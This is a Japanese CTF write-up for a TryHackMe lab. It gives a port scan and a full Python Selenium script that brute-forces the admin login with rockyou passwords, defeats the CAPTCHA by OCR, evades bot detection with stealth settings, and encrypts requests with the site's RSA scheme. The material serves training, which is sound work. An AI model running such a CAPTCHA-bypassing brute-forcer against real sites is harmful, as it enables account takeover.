# CAPTCHApocalypse CTF

https://tryhackme.com/room/captchapocalypse

## Enumeration

```shell
TARGET=10.10.246.3
```

### ポートスキャン

```sh
rustscan -a $TARGET

Open 10.10.246.3:22
Open 10.10.246.3:80
```

SSH, HTTP

HTTPは、CAPTCHA画像に文字列が書かれたログイン画面。

ユーザー名は admin で、パスワードは rockyou.txt の最初の100行を使うというヒントがある。

https://tryhackme.com/room/customtoolingviabrowserautomation のコードをベースにしているが、

- 同じページに submit ではなく、異なる PHP への POST
- 暗号化、復号化

等のカスタマイズを行っている。

```python
from selenium.webdriver.common.by import By
from selenium import webdriver
from selenium.webdriver.chrome.options import Options
from selenium.webdriver.chrome.service import Service
from selenium_stealth import stealth

import time
from fake_useragent import UserAgent
from PIL import Image, ImageEnhance, ImageFilter
import pytesseract
import io
import os
import json
import requests

from cryptography.hazmat.primitives import serialization
from cryptography.hazmat.primitives.asymmetric import padding
from cryptography.hazmat.primitives import hashes
import base64

server_public_key_pem = """-----BEGIN PUBLIC KEY-----
[REDACTED]
-----END PUBLIC KEY-----"""

client_private_key_pem = """-----BEGIN PRIVATE KEY-----
[REDACTED]
-----END PRIVATE KEY-----"""

def encrypt_data(plain_text: str) -> str:
    public_key = serialization.load_pem_public_key(server_public_key_pem.encode())
    encrypted = public_key.encrypt(
        plain_text.encode(),
        padding.PKCS1v15()
    )
    return base64.b64encode(encrypted).decode()

def decrypt_data(encrypted_b64: str) -> str:
    private_key = serialization.load_pem_private_key(
        client_private_key_pem.encode(),
        password=None
    )
    decrypted = private_key.decrypt(
        base64.b64decode(encrypted_b64),
        padding.PKCS1v15()
    )
    return decrypted.decode()


# Create folder for saving CAPTCHA images
os.makedirs("captchas", exist_ok=True)

options = Options()
ua = UserAgent()
userAgent = ua.random
options.add_argument('--no-sandbox')
options.add_argument('--headless')
options.add_argument("start-maximized")
options.add_argument(f'user-agent={userAgent}')
options.add_argument('--disable-dev-shm-usage')
options.add_argument('--disable-cache')
options.add_argument('--disable-gpu')

options.binary_location = "/usr/bin/google-chrome"
service = Service(executable_path='/home/kali/tools/chromedriver-linux64/chromedriver')
chrome = webdriver.Chrome(service=service, options=options)

stealth(chrome,
    languages=["en-US", "en"],
    vendor="Google Inc.",
    platform="Win32",
    webgl_vendor="Intel Inc.",
    renderer="Intel Iris OpenGL Engine",
    fix_hairline=True,
)

# CONFIG
ip = 'http://10.10.246.3/'
login_url = f'{ip}/index.php'
post_url = f'{ip}/server.php'

username = "admin"

with open("./rockyou100.txt", "r", encoding="utf-8", errors="ignore") as f:
    for password in f:
        password = password.strip()
        while True:
            chrome.get(login_url)
            time.sleep(1)
            #print(chrome.page_source)

            selenium_cookies = chrome.get_cookies()
            cookies = {cookie['name']: cookie['value'] for cookie in selenium_cookies}

            # Grab CSRF token
            csrf = chrome.find_element(By.NAME, "csrf_token").get_attribute("value")

            # Get CAPTCHA image rendered in-browser
            captcha_img_element = chrome.find_element(By.TAG_NAME, "img")
            captcha_png = captcha_img_element.screenshot_as_png

            # Preprocess image for OCR
            image = Image.open(io.BytesIO(captcha_png)).convert("L")
            image = image.resize((image.width * 2, image.height * 2), Image.LANCZOS)  # Resize for clarity
            image = image.filter(ImageFilter.SHARPEN)
            image = ImageEnhance.Contrast(image).enhance(2.0)
            image = image.point(lambda x: 0 if x < 140 else 255, '1')

            # OCR the CAPTCHA
            captcha_text = pytesseract.image_to_string(
                image,
                config='--psm 7 -c tessedit_char_whitelist=ABCDEFGHIJKLMNOPQRSTUVWXYZ23456789'
            ).strip().replace(" ", "").replace("\n", "").upper()

            # Save the image for review
            image.save(f"captchas/captcha_{password}_{captcha_text}.png")

            if not captcha_text.isalnum() or len(captcha_text) != 5:
                print(f"[!] OCR failed (got: '{captcha_text}'), retrying...")
                continue

            print(f"[*] Trying password: {password} with CAPTCHA: {captcha_text}")

            data = f"action=login&csrf_token={csrf}&username={username}&password={password}&captcha_input={captcha_text}"
            print("=== plain data ===")
            print(data)
            encrypted_data = encrypt_data(data)

            response = requests.post(post_url,
                headers={"Content-Type": "application/json"},
                data=json.dumps({"data": encrypted_data}),
                cookies=cookies
            )

            time.sleep(1)

            print("=== POST Response ===")
            #print(chrome.page_source)
            print(response.text)
            parsed = json.loads(response.text)
            #print(parsed)
            encrypted_base64 = parsed["data"]
            decrypted_data = decrypt_data(encrypted_base64)
            print("=== Decrypted ===")
            print(decrypted_data)
            print("================================")

            if "Login successful" in decrypted_data:
                print(f"[+] Login successful with password: {password}")
                chrome.quit()
                exit()
            elif "CAPTCHA incorrect" in decrypted_data:
                print("CAPTCHA incorrect retry")
                continue
            else:
                print(f"[-] Failed login with: {password}")
                break  # try next password

chrome.quit()
```

## 振り返り

- CSRFトークンを正しく設定しているにもかかわらず、Cookieを設定しないとCSRFトークン不正とエラーが返ってくる点で最も苦労した。

## Tags

#tags:CAPTCHA
